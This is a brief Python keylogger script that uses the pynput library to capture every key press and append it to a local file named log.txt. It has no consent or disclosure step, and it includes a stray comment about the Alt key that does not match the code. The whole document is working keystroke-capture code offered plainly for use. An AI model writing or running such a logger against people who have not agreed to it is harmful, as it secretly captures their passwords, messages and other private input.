from pynput.keyboard import Listener
def write_to_file(key):
    keydata= str(key)
    keydata= keydata.replace("'","")

    if keydata =='Key.space':
        keydata=''
    if keydata =='Key.shift_r':
        keydata=''
    with open("log.txt",'a') as f:
        f.write(keydata)


    #The left Alt key. This is a modifier.
with Listener(on_press=write_to_file)as l:
    l.join()